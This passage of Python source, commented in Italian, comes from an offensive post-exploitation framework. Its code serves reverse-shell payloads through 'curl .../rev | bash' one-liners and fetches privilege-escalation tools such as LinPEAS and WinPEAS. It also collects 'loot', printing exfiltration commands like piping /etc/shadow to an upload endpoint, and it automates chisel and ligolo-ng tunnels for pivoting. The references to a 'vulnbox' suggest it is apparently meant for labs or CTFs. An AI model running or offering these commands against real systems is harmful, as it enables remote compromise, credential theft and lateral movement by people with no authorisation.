        except Exception as e:  # noqa: BLE001
            self._send_json({"ok": False, "error": str(e)}, status=500)
            return
        self._send_json(res, status=200 if res.get("ok") else 400)

    def _api_report_asset(self) -> None:
        """Upload di un'immagine (evidenza/logo/firma) in reports/<slug>/evidence/."""
        try:
            body = json.loads(self._read_body())
            slug = str(body.get("slug", "")).strip()
            filename = os.path.basename(str(body.get("filename", "")).strip())
            data_b64 = str(body.get("data", ""))
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, status=400)
            return
        from lib.report import find_report, REPORTS_DIR, PROJECT_ROOT as _PR
        rep = find_report(slug)
        if rep is None:
            self._send_json({"ok": False, "error": "Report non trovato"}, status=404)
            return
        ext = os.path.splitext(filename)[1].lower()
        if ext not in (".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg"):
            self._send_json({"ok": False, "error": "Formato non supportato (png/jpg/gif/webp/svg)"},
                            status=400)
            return
        try:
            raw = base64.b64decode(data_b64, validate=True)
        except Exception:
            self._send_json({"ok": False, "error": "Dati immagine non validi"}, status=400)
            return
        if len(raw) > 15 * 1024 * 1024:
            self._send_json({"ok": False, "error": "Immagine troppo grande (max 15 MB)"},
                            status=400)
            return
        safe = re.sub(r"[^a-zA-Z0-9_.-]+", "_", filename) or f"img{ext}"
        ev_dir = REPORTS_DIR / rep["slug"] / "evidence"
        ev_dir.mkdir(parents=True, exist_ok=True)
        dst = ev_dir / safe
        n = 1
        while dst.exists():
            dst = ev_dir / f"{os.path.splitext(safe)[0]}_{n}{ext}"
            n += 1
        try:
            dst.write_bytes(raw)
        except OSError as e:
            self._send_json({"ok": False, "error": str(e)}, status=500)
            return
        self._send_json({"ok": True, "path": str(dst.relative_to(_PR))})

    def _api_report_preview(self) -> None:
        """Anteprima live: markdown finale calcolato in memoria (nessun file toccato)."""
        try:
            body = json.loads(self._read_body())
            slug = str(body.get("slug", "")).strip()
            meta = body.get("meta")
            sections = body.get("sections")
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, status=400)
            return
        from lib.report import find_report, preview_md
        rep = find_report(slug)
        if rep is None:
            self._send_json({"ok": False, "error": "Report non trovato"}, status=404)
            return
        md = preview_md(rep["slug"],
                        meta if isinstance(meta, dict) else None,
                        sections if isinstance(sections, dict) else None)
        if md is None:
            self._send_json({"ok": False, "error": "File .md non trovato"}, status=404)
            return
        self._send_json({"ok": True, "md": md})

    def _api_report_raw(self) -> None:
        """Salvataggio del markdown grezzo (editor Markdown nel wizard)."""
        try:
            body = json.loads(self._read_body())
            slug = str(body.get("slug", "")).strip()
            content = str(body.get("content", ""))
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, status=400)
            return
        from lib.report import find_report, report_md_path
        rep = find_report(slug)
        if rep is None:
            self._send_json({"ok": False, "error": "Report non trovato"}, status=404)
            return
        if not content.strip():
            self._send_json({"ok": False, "error": "Contenuto vuoto"}, status=400)
            return
        try:
            report_md_path(rep["slug"]).write_text(content, encoding="utf-8")
        except OSError as e:
            self._send_json({"ok": False, "error": str(e)}, status=500)
            return
        self._send_json({"ok": True})

    def _serve_report_image(self, slug: str, fname: str) -> None:
        if ".." in fname or "/" in fname:
            self.send_error(403)
            return
        from lib.report import REPORTS_DIR
        img = REPORTS_DIR / slug / "evidence" / fname
        if not img.is_file():
            self.send_error(404, "Immagine non trovata")
            return
        self._send_file_bytes(img)

    def _serve_report_asset_file(self, fname: str) -> None:
        if ".." in fname or "/" in fname:
            self.send_error(403)
            return
        from lib.report import REPORT_ROOT
        f = REPORT_ROOT / "assets" / fname
        if not f.is_file():
            self.send_error(404, "Asset non trovato")
            return
        self._send_file_bytes(f)

    def _send_file_bytes(self, path: Path) -> None:
        ctype = {".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
                 ".gif": "image/gif", ".webp": "image/webp",
                 ".svg": "image/svg+xml"}.get(path.suffix.lower(), "application/octet-stream")
        try:
            data = path.read_bytes()
        except OSError:
            self.send_error(500)
            return
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _serve_report_raw(self, slug: str) -> None:
        if ".." in slug or "/" in slug:
            self.send_error(403)
            return
        from lib.report import find_report
        rep = find_report(slug)
        if rep is None:
            self.send_error(404, "Report non trovato")
            return
        try:
            data = Path(rep["md"]).read_bytes()
        except OSError:
            self.send_error(500)
            return
        fname = Path(rep["md"]).name
        self.send_response(200)
        self.send_header("Content-Type", "text/markdown; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Content-Disposition", f'attachment; filename="{fname}"')
        self.end_headers()
        self.wfile.write(data)

    def _serve_report_pdf(self, slug: str) -> None:
        if ".." in slug or "/" in slug:
            self.send_error(403)
            return
        from lib.report import find_report
        rep = find_report(slug)
        if rep is None or not rep["pdf"]:
            self.send_error(404, "PDF non trovato — genera prima il PDF con Build")
            return
        try:
            data = Path(rep["pdf"]).read_bytes()
        except OSError:
            self.send_error(500)
            return
        fname = Path(rep["pdf"]).name
        self.send_response(200)
        self.send_header("Content-Type", "application/pdf")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Content-Disposition", f'inline; filename="{fname}"')
        self.end_headers()
        self.wfile.write(data)

    def _serve_linseal(self, qs: dict) -> None:
        script_path = STATIC_ROOT / "linseal.sh"
        if not script_path.is_file():
            self.send_error(404, "linseal.sh non trovato in static/")
            return
        try:
            script = script_path.read_text(encoding="utf-8")
        except OSError:
            self.send_error(500)
            return

        flags = qs.get("f", [""])[0] if "f" in qs else parsed_query_flags(self.path)
        args_line = ""
        if flags:
            parts = []
            if "o" in flags:
                parts.append("-o")
            if "s" in flags:
                parts.append("-s")
            if "l" in flags:
                parts.append("-l")
            if parts:
                args_line = " ".join(parts)

        srv_port = _server.server_address[1] if _server else _srv_port

        if args_line:
            wrapper = f'#!/bin/sh\n_LINSEAL_SELF=$(mktemp /tmp/linseal.XXXXXX 2>/dev/null || mktemp /dev/shm/linseal.XXXXXX)\ntrap "rm -f \\"$_LINSEAL_SELF\\"" EXIT\ncat > "$_LINSEAL_SELF" <<\'__LINSEAL_EOF__\'\n{script}\n__LINSEAL_EOF__\nchmod +x "$_LINSEAL_SELF"\nexport LHOST="{_lhost}"\nexport SLPORT="{srv_port}"\n"$_LINSEAL_SELF" {args_line}\n'
        else:
            wrapper = f'#!/bin/sh\nexport LHOST="{_lhost}"\nexport SLPORT="{srv_port}"\n' + script

        self._send_text(wrapper)

    def _serve_slrecon(self, qs: dict) -> None:
        script_path = STATIC_ROOT / "slrecon.sh"
        if not script_path.is_file():
            self.send_error(404, "slrecon.sh non trovato in static/")
            return
        try:
            script = script_path.read_text(encoding="utf-8")
        except OSError:
            self.send_error(500)
            return

        flags = qs.get("f", [""])[0] if "f" in qs else parsed_query_flags(self.path)
        args_line = ""
        if flags:
            parts = []
            if "o" in flags:
                parts.append("-o")
            if "s" in flags:
                parts.append("-s")
            if "l" in flags:
                parts.append("-l")
            if parts:
                args_line = " ".join(parts)

        srv_port = _server.server_address[1] if _server else _srv_port

        if args_line:
            wrapper = f'#!/bin/sh\n_SLRECON_SELF=$(mktemp /tmp/slrecon.XXXXXX 2>/dev/null || mktemp /dev/shm/slrecon.XXXXXX)\ntrap "rm -f \\"$_SLRECON_SELF\\"" EXIT\ncat > "$_SLRECON_SELF" <<\'__SLRECON_EOF__\'\n{script}\n__SLRECON_EOF__\nchmod +x "$_SLRECON_SELF"\nexport LHOST="{_lhost}"\nexport SLPORT="{srv_port}"\n"$_SLRECON_SELF" {args_line} "$@"\n'
        else:
            wrapper = f'#!/bin/sh\nexport LHOST="{_lhost}"\nexport SLPORT="{srv_port}"\n' + script

        self._send_text(wrapper)

    def _serve_loot_raw(self, name: str) -> None:
        if ".." in name or "/" in name or "\\" in name:
            self.send_error(403)
            return
        target = LOOT_ROOT / name
        if not target.is_file():
            self.send_error(404, f"File non trovato: {name}")
            return
        try:
            data = target.read_bytes()
        except OSError:
            self.send_error(500)
            return
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Content-Disposition", f'attachment; filename="{target.name}"')
        self.end_headers()
        self.wfile.write(data)


class _QuietTCPServer(socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def handle_error(self, request, client_address):
        pass


def start(port: int | None = None, lhost: str | None = None, lport: int | None = None) -> str:
    global _server, _thread, _lhost, _lport, _srv_port

    if _server is not None:
        return f"Server già attivo su porta {_server.server_address[1]}."

    if port is None:
        port = _srv_port
    _srv_port = port

    _lhost = lhost or get_default_ip()
    if lport is not None:
        _lport = lport

    try:
        _server = _QuietTCPServer(("", port), SlRequestHandler)
    except OSError as exc:
        return f"Impossibile avviare il server sulla porta {port}: {exc}"

    _thread = threading.Thread(target=_server.serve_forever, daemon=True)
    _thread.start()

    base = f"http://{_lhost}:{port}"
    out = [
        f"Server attivo su \033[92m{base}\033[0m  "
        f"(LHOST={_lhost}  LPORT={_lport})",
        "",
        f"  \033[96mSLWeb:\033[0m            {base}",
        f"  \033[96mDelivery panel:\033[0m   {base}/delivery",
        "",
        f"  curl {base}/upgrade | bash",
        f"  curl {base}/rev | bash",
        f"  curl {base}/sh | bash",
    ]
    if STATIC_ROOT.is_dir():
        static_files = sorted(f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith("."))
        if static_files:
            out.append("")
            for f in static_files:
                name = f.name
                if name.endswith(".sh"):
                    out.append(f"  curl {base}/{name} | bash")
                elif name.endswith(".exe"):
                    out.append(f"  curl {base}/{name} -o {name}")
                else:
                    out.append(f"  curl {base}/{name} -o {name} && chmod +x {name}")
    return "\n".join(out)


def stop() -> str:
    global _server, _thread
    if _server is None:
        return "Nessun server attivo."
    _server.shutdown()
    _server.server_close()
    _server = None
    _thread = None
    return "Server arrestato."


def is_running() -> bool:
    return _server is not None


def status() -> str:
    if _server is None:
        return "Server non attivo."
    port = _server.server_address[1]
    return f"Server attivo su http://{_lhost}:{port}  (LHOST={_lhost}  LPORT={_lport})"


# ---------------------------------------------------------------------------
# Catalogo tool di post-exploitation da scaricare in static/
# ---------------------------------------------------------------------------

TOOL_CATALOG: list[dict[str, str]] = [
    {
        "name": "linpeas.sh",
        "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
        "desc": "LinPEAS — Linux Privilege Escalation",
    },
    {
        "name": "winPEASx64.exe",
        "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe",
        "desc": "WinPEAS x64 — Windows Privilege Escalation",
    },
    {
        "name": "winPEASx86.exe",
        "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe",
        "desc": "WinPEAS x86 — Windows Privilege Escalation",
    },
    {
        "name": "pspy64",
        "url": "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64",
        "desc": "pspy — monitor processi senza root",
    },
    {
        "name": "pspy32",
        "url": "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32",
        "desc": "pspy — monitor processi senza root (32bit)",
    },
    {
        "name": "linpeas_linux_amd64",
        "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64",
        "desc": "LinPEAS binario statico — no bash/sh necessario",
    },
    {
        "name": "linux-exploit-suggester.sh",
        "url": "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
        "desc": "Linux Exploit Suggester — suggerisce exploit kernel",
    },
    {
        "name": "linenum.sh",
        "url": "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
        "desc": "LinEnum — enumerazione Linux classica",
    },
]


def _download_file(url: str, dest: Path) -> bool:
    try:
        subprocess.run(
            ["curl", "-sL", "--fail", "-o", str(dest), url],
            timeout=120, check=True,
        )
        return True
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
        pass
    try:
        subprocess.run(
            ["wget", "-q", "-O", str(dest), url],
            timeout=120, check=True,
        )
        return True
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
        pass
    return False


def fetch_tools(force: bool = False) -> str:
    STATIC_ROOT.mkdir(parents=True, exist_ok=True)
    lines: list[str] = []
    ok = 0
    skip = 0
    fail = 0

    for entry in TOOL_CATALOG:
        dest = STATIC_ROOT / entry["name"]
        if dest.exists() and not force:
            skip += 1
            lines.append(f"  \033[90m[skip]\033[0m {entry['name']}  (già presente)")
            continue
        print(f"  \033[93m[download]\033[0m {entry['name']}...")
        if _download_file(entry["url"], dest):
            size = dest.stat().st_size
            if size > 1_048_576:
                label = f"{size / 1_048_576:.1f} MB"
            else:
                label = f"{size / 1024:.1f} KB"
            ok += 1
            lines.append(f"  \033[92m[ok]\033[0m {entry['name']}  ({label})")
        else:
            fail += 1
            lines.append(f"  \033[91m[errore]\033[0m {entry['name']}  — download fallito")
            if dest.exists():
                dest.unlink()

    summary = f"\nRisultato: {ok} scaricati, {skip} già presenti, {fail} errori"
    lines.append(summary)
    lines.append(f"Cartella: {STATIC_ROOT}")
    return "\n".join(lines)


def list_static() -> str:
    if _server is not None:
        port = _server.server_address[1]
        base = f"http://{_lhost}:{port}"
    else:
        base = "http://<LHOST>:2727"
    lines = [
        "\n\033[1mEndpoint dinamici:\033[0m",
        f"  curl {base}/upgrade | bash    \033[90m# Upgrade shell (socat/python pty)\033[0m",
        f"  curl {base}/upgrade2 | bash   \033[90m# Upgrade in-place (no nuova connessione)\033[0m",
        f"  curl {base}/rev | bash        \033[90m# Reverse shell Bash\033[0m",
        f"  curl {base}/sh | bash         \033[90m# Reverse shell Python\033[0m",
    ]
    if not STATIC_ROOT.is_dir():
        lines.append("\n\033[1mFile statici:\033[0m\n  Cartella static/ non trovata.")
        return "\n".join(lines)
    files = sorted(f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith("."))
    if not files:
        lines.append("\n\033[1mFile statici:\033[0m\n  Nessun file in static/. Usa 'serve fetch' per scaricare i tool.")
        return "\n".join(lines)
    lines.append(f"\n\033[1mFile statici ({len(files)}):\033[0m")
    for f in files:
        name = f.name
        if name.endswith(".sh"):
            lines.append(f"  curl {base}/{name} | bash")
        elif name.endswith(".exe"):
            lines.append(f"  curl {base}/{name} -o {name}")
        else:
            lines.append(f"  curl {base}/{name} -o {name} && chmod +x {name}")
    return "\n".join(lines)


def list_loot() -> str:
    if _server is not None:
        port = _server.server_address[1]
        base = f"http://{_lhost}:{port}"
    else:
        base = "http://<LHOST>:2727"

    items = _discover_loot()
    if not items:
        lines = [
            "\n\033[1mLoot:\033[0m\n  Nessun file ricevuto.",
            "",
            "\033[1mComandi dalla vulnbox:\033[0m",
            f'  curl -F "file=@/path/file" {base}/upload',
            f"  cat /etc/shadow | curl -X POST -d @- {base}/upload/shadow.txt",
            f"  curl -T /tmp/db.sqlite {base}/upload/db.sqlite",
        ]
        return "\n".join(lines)

    lines = [f"\n\033[1mLoot ({len(items)} file):\033[0m"]
    for i, it in enumerate(items, 1):
        preview = ""
        if it["is_text"] and it["preview"]:
            first_line = it["preview"].splitlines()[0][:60]
            preview = f"  \033[90m{first_line}\033[0m"
        lines.append(f"  [{i}] {it['name']}  ({it['size']})")
        if preview:
            lines.append(f"      {preview}")
    lines.append(f"\n  Cartella: {LOOT_ROOT}")
    return "\n".join(lines)


def read_loot(name: str) -> str | None:
    target = LOOT_ROOT / name
    if not target.is_file():
        return None
    try:
        return target.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return None


def clear_loot() -> str:
    if not LOOT_ROOT.is_dir():
        return "Nessun file loot da eliminare."
    count = 0
    for f in LOOT_ROOT.iterdir():
        if f.is_file() and not f.name.startswith("."):
            f.unlink()
            count += 1
    return f"Eliminati {count} file dalla cartella loot/."


# ---------------------------------------------------------------------------
# Tunnel (chisel port-forwarding)
# ---------------------------------------------------------------------------

CHISEL_URL = "https://github.com/jpillora/chisel/releases/latest/download/chisel_{ver}_linux_amd64.gz"
CHISEL_BIN = STATIC_ROOT / "chisel"

_chisel_proc: subprocess.Popen | None = None
_chisel_server_port: int = 0
_tunnels: list[dict] = []


def _chisel_latest_version() -> str:
    """Get latest chisel version tag from GitHub."""
    try:
        out = subprocess.run(
            ["curl", "-sI", "https://github.com/jpillora/chisel/releases/latest"],
            capture_output=True, text=True, timeout=10,
        )
        for line in out.stdout.splitlines():
            if line.lower().startswith("location:"):
                return line.strip().rsplit("/", 1)[-1].lstrip("v")
    except Exception:
        pass
    return "1.10.1"


def tunnel_fetch(force: bool = False) -> str:
    """Download chisel binary to static/."""
    STATIC_ROOT.mkdir(parents=True, exist_ok=True)
    if CHISEL_BIN.exists() and not force:
        size = CHISEL_BIN.stat().st_size
        return f"chisel già presente in static/ ({size // 1024} KB). Usa --force per riscaricare."

    ver = _chisel_latest_version()
    gz_url = f"https://github.com/jpillora/chisel/releases/download/v{ver}/chisel_{ver}_linux_amd64.gz"
    gz_dest = STATIC_ROOT / "chisel.gz"

    print(f"  Scaricamento chisel v{ver}...")
    if not _download_file(gz_url, gz_dest):
        return "[-] Download di chisel fallito."

    import gzip
    tmp_bin = STATIC_ROOT / "chisel.tmp"
    try:
        with gzip.open(gz_dest, "rb") as gz, open(tmp_bin, "wb") as out:
            out.write(gz.read())
        tmp_bin.chmod(0o755)
        if CHISEL_BIN.exists():
            CHISEL_BIN.unlink()
        os.replace(str(tmp_bin), str(CHISEL_BIN))
        gz_dest.unlink(missing_ok=True)
        size = CHISEL_BIN.stat().st_size
        return f"[+] chisel v{ver} scaricato ({size // 1024} KB) → static/chisel"
    except Exception as e:
        tmp_bin.unlink(missing_ok=True)
        gz_dest.unlink(missing_ok=True)
        return f"[-] Errore estrazione chisel: {e}"


def tunnel_start(remote_port: int, local_port: int = 9000,
                 server_port: int = 8443, lhost: str | None = None) -> str:
    """Start chisel server and register a tunnel."""
    global _chisel_proc, _chisel_server_port

    if lhost is None:
        lhost = _lhost or get_default_ip()

    if not CHISEL_BIN.exists():
        return ("[-] chisel non trovato in static/.\n"
                "    Usa 'tunnel fetch' per scaricarlo.")

    if _chisel_proc is not None and _chisel_proc.poll() is None:
        for t in _tunnels:
            if t["remote"] == remote_port:
                return f"[-] Tunnel per la porta {remote_port} già attivo su localhost:{t['local']}."

    if _chisel_proc is None or _chisel_proc.poll() is not None:
        try:
            _chisel_proc = subprocess.Popen(
                [str(CHISEL_BIN), "server", "--reverse", "--port", str(server_port)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            _chisel_server_port = server_port
        except Exception as e:
            return f"[-] Errore avvio chisel server: {e}"

    tunnel_info = {"remote": remote_port, "local": local_port, "lhost": lhost}
    _tunnels.append(tunnel_info)

    serve_port = _server.server_address[1] if _server else _srv_port
    base = f"http://{lhost}:{serve_port}"

    lines = [
        "",
        f"  \033[92m[+] Chisel server attivo sulla porta {server_port}\033[0m",
        f"  \033[92m[+] Tunnel registrato: target:{remote_port} → localhost:{local_port}\033[0m",
        "",
        "  \033[1mIncolla nella revshell:\033[0m",
        "",
        f"  \033[96mcurl {base}/static/chisel -o /tmp/chisel && chmod +x /tmp/chisel && "
        f"/tmp/chisel client {lhost}:{server_port} R:{local_port}:127.0.0.1:{remote_port} &\033[0m",
        "",
        f"  \033[1mPoi apri nel browser:\033[0m  http://localhost:{local_port}",
        "",
    ]
    return "\n".join(lines)


def tunnel_stop() -> str:
    """Stop chisel server and clear all tunnels."""
    global _chisel_proc, _chisel_server_port
    if _chisel_proc is None:
        return "Nessun tunnel attivo."
    try:
        _chisel_proc.terminate()
        _chisel_proc.wait(timeout=5)
    except Exception:
        try:
            _chisel_proc.kill()
            _chisel_proc.wait(timeout=3)
        except Exception:
            pass
    import time
    time.sleep(0.3)
    _chisel_proc = None
    _chisel_server_port = 0
    count = len(_tunnels)
    _tunnels.clear()
    return f"Chisel server terminato. {count} tunnel chiusi."


def tunnel_status() -> str:
    """Return tunnel status."""
    if _chisel_proc is None or _chisel_proc.poll() is not None:
        return "Nessun tunnel attivo."
    lines = [
        f"\n  \033[92mChisel server:\033[0m attivo (porta {_chisel_server_port}, PID {_chisel_proc.pid})",
    ]
    if _tunnels:
        lines.append(f"  \033[1mTunnel attivi:\033[0m {len(_tunnels)}")
        for i, t in enumerate(_tunnels, 1):
            lines.append(f"    [{i}] target:{t['remote']} → localhost:{t['local']}")
    else:
        lines.append("  Nessun tunnel registrato.")
    lines.append("")
    return "\n".join(lines)


def tunnel_list() -> str:
    """List active tunnels."""
    if not _tunnels:
        return "Nessun tunnel attivo."
    lines = [f"\n  \033[1mTunnel attivi ({len(_tunnels)}):\033[0m\n"]
    for i, t in enumerate(_tunnels, 1):
        lines.append(f"    [{i}] target:{t['remote']} → \033[96mhttp://localhost:{t['local']}\033[0m")
    lines.append("")
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Pivot (ligolo-ng full IP tunneling)
# ---------------------------------------------------------------------------

LIGOLO_PROXY_BIN = STATIC_ROOT / "ligolo-proxy"
LIGOLO_AGENT_BIN = STATIC_ROOT / "ligolo-agent"
_LIGOLO_TUN = "ligolo"
_LIGOLO_DEFAULT_PORT = 11601

_ligolo_proc: subprocess.Popen | None = None
_ligolo_port: int = 0
_ligolo_routes: list[str] = []


def _ligolo_latest_version() -> str:
    try:
        out = subprocess.run(
            ["curl", "-sI", "https://github.com/nicocha30/ligolo-ng/releases/latest"],
            capture_output=True, text=True, timeout=10,
        )
        for line in out.stdout.splitlines():
            if line.lower().startswith("location:"):
                return line.strip().rsplit("/", 1)[-1].lstrip("v")
    except Exception:
        pass
    return "0.7.5"


def pivot_fetch(force: bool = False) -> str:
    STATIC_ROOT.mkdir(parents=True, exist_ok=True)

    if LIGOLO_PROXY_BIN.exists() and LIGOLO_AGENT_BIN.exists() and not force:
        ps = LIGOLO_PROXY_BIN.stat().st_size
        ags = LIGOLO_AGENT_BIN.stat().st_size
        return (f"ligolo-ng già presente in static/ "
                f"(proxy {ps // 1024} KB, agent {ags // 1024} KB). "
                f"Usa --force per riscaricare.")

    ver = _ligolo_latest_version()
    results: list[str] = []

    for role, dest in [("proxy", LIGOLO_PROXY_BIN), ("agent", LIGOLO_AGENT_BIN)]:
        tar_name = f"ligolo-ng_{role}_{ver}_linux_amd64.tar.gz"
        tar_url = (f"https://github.com/nicocha30/ligolo-ng/releases/"
                   f"download/v{ver}/{tar_name}")
        tar_dest = STATIC_ROOT / tar_name

        print(f"  Scaricamento ligolo-ng {role} v{ver}...")
        if not _download_file(tar_url, tar_dest):
            results.append(f"[-] Download di ligolo-ng {role} fallito.")
            continue

        import tarfile
        tmp_bin = STATIC_ROOT / f"{dest.name}.tmp"
        try:
            with tarfile.open(tar_dest, "r:gz") as tf:
                found = False
                for member in tf.getmembers():
                    basename = member.name.rsplit("/", 1)[-1]
                    if basename in (role, f"ligolo-{role}", dest.name):
                        member.name = tmp_bin.name
                        tf.extract(member, STATIC_ROOT)
                        found = True
                        break
                if not found:
                    first = next((m for m in tf.getmembers() if not m.isdir()), None)
                    if first:
                        first.name = tmp_bin.name
                        tf.extract(first, STATIC_ROOT)
                        found = True
                if not found:
                    raise FileNotFoundError("binario non trovato nell'archivio")
            tmp_bin.chmod(0o755)
            if dest.exists():
                dest.unlink()
            os.replace(str(tmp_bin), str(dest))
            tar_dest.unlink(missing_ok=True)
            size = dest.stat().st_size
            results.append(f"[+] ligolo-ng {role} v{ver} scaricato ({size // 1024} KB)")
        except Exception as e:
            tmp_bin.unlink(missing_ok=True)
            tar_dest.unlink(missing_ok=True)
            results.append(f"[-] Errore estrazione ligolo-ng {role}: {e}")

    return "\n  ".join([""] + results)


def _pivot_tun_exists() -> bool:
    try:
        out = subprocess.run(
            ["ip", "link", "show", _LIGOLO_TUN],
            capture_output=True, text=True, timeout=5,
        )
        return out.returncode == 0
    except Exception:
        return False


def _pivot_setup_tun() -> str | None:
    if _pivot_tun_exists():
        return None
    try:
        subprocess.run(
            ["sudo", "-n", "ip", "tuntap", "add", "user",
             os.environ.get("USER", "root"), "mode", "tun", _LIGOLO_TUN],
            capture_output=True, text=True, timeout=10, check=True,
        )
        subprocess.run(
            ["sudo", "-n", "ip", "link", "set", _LIGOLO_TUN, "up"],
            capture_output=True, text=True, timeout=10, check=True,
        )
        return None
    except subprocess.CalledProcessError:
        return ("[-] Impossibile creare l'interfaccia TUN.\n"
                "    Esegui manualmente:\n\n"
                f"    sudo ip tuntap add user $USER mode tun {_LIGOLO_TUN}\n"
                f"    sudo ip link set {_LIGOLO_TUN} up")
    except FileNotFoundError:
        return "[-] Comando 'ip' non trovato."


def _pivot_teardown_tun() -> None:
    if not _pivot_tun_exists():
        return
    try:
        subprocess.run(
            ["sudo", "-n", "ip", "link", "del", _LIGOLO_TUN],
            capture_output=True, timeout=10,
        )
    except Exception:
        pass


def pivot_start(port: int = _LIGOLO_DEFAULT_PORT,
                lhost: str | None = None) -> str:
    global _ligolo_proc, _ligolo_port

    if lhost is None:
        lhost = _lhost or get_default_ip()

    if not LIGOLO_PROXY_BIN.exists():
        return ("[-] ligolo-proxy non trovato in static/.\n"
                "    Usa 'pivot fetch' per scaricarlo.")

    if _ligolo_proc is not None and _ligolo_proc.poll() is None:
        return (f"[-] Proxy già attivo (PID {_ligolo_proc.pid}, "
                f"porta {_ligolo_port}).\n"
                f"    Usa 'pivot stop' prima di riavviare.")

    tun_err = _pivot_setup_tun()
    if tun_err:
        return tun_err

    try:
        _ligolo_proc = subprocess.Popen(
            [str(LIGOLO_PROXY_BIN), "-selfcert",
             "-laddr", f"0.0.0.0:{port}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
        )
        _ligolo_port = port
    except Exception as e:
        return f"[-] Errore avvio ligolo-proxy: {e}"

    serve_port = _server.server_address[1] if _server else _srv_port
    base = f"http://{lhost}:{serve_port}"

    lines = [
        "",
        f"  \033[92m[+] Interfaccia TUN '{_LIGOLO_TUN}' attiva\033[0m",
        f"  \033[92m[+] ligolo-proxy in ascolto sulla porta {port}\033[0m",
        "",
        "  \033[1mIncolla nella revshell:\033[0m",
        "",
        f"  \033[96mcurl {base}/static/ligolo-agent -o /tmp/agent && "
        f"chmod +x /tmp/agent && "
        f"/tmp/agent -connect {lhost}:{port} -ignore-cert &\033[0m",
        "",
        "  \033[1mDopo la connessione dell'agent:\033[0m",
        "",
        f"  \033[96mpivot session\033[0m          — avvia il tunnel sulla sessione",
        f"  \033[96mpivot route add \033[0m\033[96m<CIDR>\033[0m  — aggiungi rotta (es: 172.16.0.0/24)",
        "",
    ]
    return "\n".join(lines)


def pivot_stop() -> str:
    global _ligolo_proc, _ligolo_port

    if _ligolo_proc is None:
        return "Nessun pivot attivo."

    for cidr in list(_ligolo_routes):
        _pivot_del_route(cidr)

    try:
        _ligolo_proc.terminate()
        _ligolo_proc.wait(timeout=5)
    except Exception:
        try:
            _ligolo_proc.kill()
            _ligolo_proc.wait(timeout=3)
        except Exception:
            pass

    import time
    time.sleep(0.3)

    _pivot_teardown_tun()
    count = len(_ligolo_routes)
    _ligolo_routes.clear()
    _ligolo_proc = None
    _ligolo_port = 0
    return f"Pivot terminato. Proxy fermato, TUN rimossa, {count} rotte rimosse."


def pivot_session() -> str:
    if _ligolo_proc is None or _ligolo_proc.poll() is not None:
        return "[-] Nessun proxy attivo. Usa 'pivot on' per avviare."

    lhost = _lhost or get_default_ip()
    return (f"\n  \033[92m[+] Proxy attivo\033[0m (PID {_ligolo_proc.pid}, "
            f"porta {_ligolo_port})\n\n"
            f"  Il proxy accetta connessioni automaticamente.\n"
            f"  Per gestire le sessioni interattivamente:\n\n"
            f"  \033[96m1.\033[0m Stoppa il proxy:  \033[96mpivot stop\033[0m\n"
            f"  \033[96m2.\033[0m Avvialo a mano:   "
            f"\033[96m./static/ligolo-proxy -selfcert -laddr 0.0.0.0:{_ligolo_port}\033[0m\n"
            f"  \033[96m3.\033[0m Nella shell del proxy:  "
            f"\033[96msession → 1 → start\033[0m\n\n"
            f"  Oppure aggiungi direttamente le rotte con "
            f"\033[96mpivot route add <CIDR>\033[0m\n")


def _pivot_add_route(cidr: str) -> str | None:
    try:
        subprocess.run(
            ["sudo", "-n", "ip", "route", "add", cidr, "dev", _LIGOLO_TUN],
            capture_output=True, text=True, timeout=10, check=True,
        )
        return None
    except subprocess.CalledProcessError as e:
        stderr = e.stderr.strip() if e.stderr else ""
        if "File exists" in stderr:
            return f"Rotta {cidr} già presente."
        return (f"[-] Impossibile aggiungere rotta.\n"
                f"    Esegui manualmente:  sudo ip route add {cidr} dev {_LIGOLO_TUN}")
    except FileNotFoundError:
        return "[-] Comando 'ip' non trovato."


def _pivot_del_route(cidr: str) -> str | None:
    try:
        subprocess.run(
            ["sudo", "-n", "ip", "route", "del", cidr, "dev", _LIGOLO_TUN],
            capture_output=True, text=True, timeout=10, check=True,
        )
        return None
    except Exception:
        return None


def pivot_route_add(cidr: str) -> str:
    if _ligolo_proc is None or _ligolo_proc.poll() is not None:
        return "[-] Nessun pivot attivo. Usa 'pivot on' per avviare."
    err = _pivot_add_route(cidr)
    if err:
        return err
    if cidr not in _ligolo_routes:
        _ligolo_routes.append(cidr)
    return f"\033[92m[+]\033[0m Rotta aggiunta: {cidr} → dev {_LIGOLO_TUN}"


def pivot_route_del(cidr: str) -> str:
    err = _pivot_del_route(cidr)
    if err:
        return err
    if cidr in _ligolo_routes:
        _ligolo_routes.remove(cidr)
    return f"Rotta rimossa: {cidr}"


def pivot_route_list() -> str:
    if not _ligolo_routes:
